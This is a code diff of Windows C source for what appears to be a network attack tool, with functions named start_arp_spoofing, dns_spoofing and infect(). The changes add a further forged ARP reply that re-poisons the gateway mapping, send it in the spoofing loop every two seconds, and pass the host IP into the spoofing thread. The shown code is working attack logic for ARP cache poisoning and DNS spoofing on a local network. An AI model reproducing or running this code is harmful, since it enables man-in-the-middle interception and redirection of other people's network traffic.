@@ -38,10 +38,12 @@ static DWORD WINAPI start_arp_spoofing(
 	LPVOID lparam
 )
 {
+	uint32_t host_ip = *(uint32_t*)lparam;
 	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);
 	
 	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
 	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
+	u_char rearping_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
 
 	/* build the packets */
 	build_packet(
@@ -62,11 +64,20 @@ static DWORD WINAPI start_arp_spoofing(
 		2
 	);
 
+	build_packet(
+		rearping_packet,
+		htonl(infect_params.gateway_ip),
+		htonl(host_ip),
+		infect_params.gateway_mac,
+		infect_params.adapter->Address,
+		2
+	);
 	
 	while (!finished_infecting)
 	{
 		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
 		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
+		pcap_sendpacket(infect_params.fp, rearping_packet, pack_size);
 		Sleep(2000);
 	}
 
@@ -228,6 +239,7 @@ static int dns_spoofing(
 
 void infect()
 {
+
 	PIP_ADAPTER_INFO pAdapterInfo = NULL;
 	ULONG outBufLen = 0;
 	uint32_t host, netmask;
@@ -309,7 +321,7 @@ void infect()
 
 	/*start send_packet thread*/
 	HANDLE hThread;
-	hThread = CreateThread(NULL, 0, start_arp_spoofing, NULL, 0, NULL);
+	hThread = CreateThread(NULL, 0, start_arp_spoofing, (LPVOID)&host, 0, NULL);
 	if (!hThread)
 	{
 		free(pAdapterInfo);
